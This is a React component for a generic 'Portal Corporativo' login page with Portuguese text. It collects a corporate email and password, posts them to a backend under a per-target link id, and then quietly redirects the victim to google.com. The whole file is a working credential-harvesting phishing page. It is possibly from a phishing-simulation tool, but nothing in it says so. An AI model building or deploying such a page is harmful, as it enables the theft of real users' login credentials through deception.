import React, { useState } from 'react';

const DefaultLanding = ({ linkId }) => {
  const [formData, setFormData] = useState({ email: '', password: '' });

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const response = await fetch(`${process.env.REACT_APP_BACKEND_URL}/landing/submit/${linkId}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(formData),
      });

      if (response.ok) {
        window.location.href = 'https://www.google.com';
      } else {
        console.error('Erro ao enviar');
      }
    } catch (error) {
      console.error('Erro ao submeter:', error);
    }
  };

  const handleChange = (e) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  return (
    <div style={{ 
      minHeight: "100vh", 
      display: "flex", 
      justifyContent: "center", 
      alignItems: "center", 
      background: "linear-gradient(135deg, #f8f8f8, #e0e0e0)"
    }}>
      <div style={{ 
        background: "white", 
        padding: "40px", 
        borderRadius: "12px", 
        boxShadow: "0 8px 20px rgba(0, 0, 0, 0.1)", 
        textAlign: "center"
      }}>
        <h1>Portal Corporativo</h1>
        <p>Insira suas credenciais para acessar a plataforma.</p>
        <form onSubmit={handleSubmit}>
          <input
            type="email"
            name="email"
            placeholder="Email corporativo"
            value={formData.email}
            onChange={handleChange}
            required
            style={{ margin: "8px 0", padding: "10px", width: "100%", borderRadius: "8px", border: "1px solid #ccc" }}
          />
          <input
            type="password"
            name="password"
            placeholder="Senha"
            value={formData.password}
            onChange={handleChange}
            required
            style={{ margin: "8px 0", padding: "10px", width: "100%", borderRadius: "8px", border: "1px solid #ccc" }}
          />
          <button
            type="submit"
            style={{ marginTop: "12px", padding: "12px", width: "100%", borderRadius: "8px", backgroundColor: "#007bff", color: "white", fontWeight: "600", border: "none" }}
          >
            Entrar
          </button>
        </form>
      </div>
    </div>
  );
};

export default DefaultLanding;
